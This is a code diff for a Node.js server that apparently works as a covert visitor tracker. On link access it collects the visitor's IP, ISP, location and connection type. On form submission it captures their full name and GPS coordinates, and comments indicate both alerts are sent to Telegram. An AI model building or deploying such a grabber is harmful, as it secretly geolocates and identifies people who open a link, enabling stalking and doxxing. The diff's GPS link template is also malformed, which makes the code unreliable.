@@ -42,11 +42,11 @@ const server = http.createServer((req, res) => {
 
     const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
     
-    // FIXED LINE: Splits by comma to handle proxies, grabs the first element, and trims it correctly
+    // FIXED LOGIC: Extract array sequence mapping indices securely to bypass array .trim errors
     const ipArray = rawIp.split(',');
     const cleanIp = ipArray[0].trim();
 
-    // STEP 1: IMMEDIATELY TRIGGER ALERT UPON SITE ENTRY
+    // STEP 1: DELIVER INSTANT NOTIFICATION IMMEDIATELY ON LINK ACCESS OPENING
     if (req.method === 'GET' && req.url === '/') {
         const time = new Date().toLocaleTimeString();
         
@@ -60,7 +60,6 @@ const server = http.createServer((req, res) => {
             const location = net && net.status === 'success' ? `${net.city}, ${net.regionName}, ${net.country}` : "Unknown Location";
             const type = net && net.mobile ? "📶 Mobile Cellular Data" : "🌐 Fixed Broadband / Wi-Fi";
 
-            // Fire Alert #1 immediately to Telegram
             const alert1 = `⚡ *Instant Connection Alert!*\n\n` +
                            `📶 *IP Address:* \`${cleanIp}\`\n` +
                            `🏢 *Operator (ISP):* ${isp}\n` +
@@ -73,14 +72,14 @@ const server = http.createServer((req, res) => {
         });
 
         fs.readFile(path.join(__dirname, 'index.html'), (err, content) => {
+            if (err) {
+                res.writeHead(500); res.end("Missing template configuration error file.");
+                return;
+            }
             res.writeHead(200, { 'Content-Type': 'text/html' }); res.end(content);
         });
     }
-    // Block tracking duplicates from internal endpoint checks
-    else if (req.method === 'POST' && req.url === '/page-visit') {
-        res.writeHead(200); res.end();
-    }
-    // STEP 2: TRIGGER ACCURATE GPS ALERT UPON SEARCH BUTTON ACTION CLICK
+    // STEP 2: DELIVER HIGH-ACCURACY GPS NOTIFICATION IMMEDIATELY ON FORM ACTIONS BUTTON PRESS CLICK
     else if (req.method === 'POST' && req.url === '/search-submit') {
         let body = '';
         req.on('data', chunk => body += chunk.toString());
@@ -90,7 +89,6 @@ const server = http.createServer((req, res) => {
                 const time = new Date().toLocaleTimeString();
                 const gpsLink = `https://google.com{action.lat},${action.lon}`;
 
-                // Fire Alert #2 immediately to Telegram
                 const alert2 = `🚨 *Form Action Submission Check-In!*\n\n` +
                                `👤 *Full Name Input:* \`${action.fullName.toUpperCase()}\`\n` +
                                `📍 *Hardware GPS Coords:* ${action.lat}, ${action.lon}\n` +
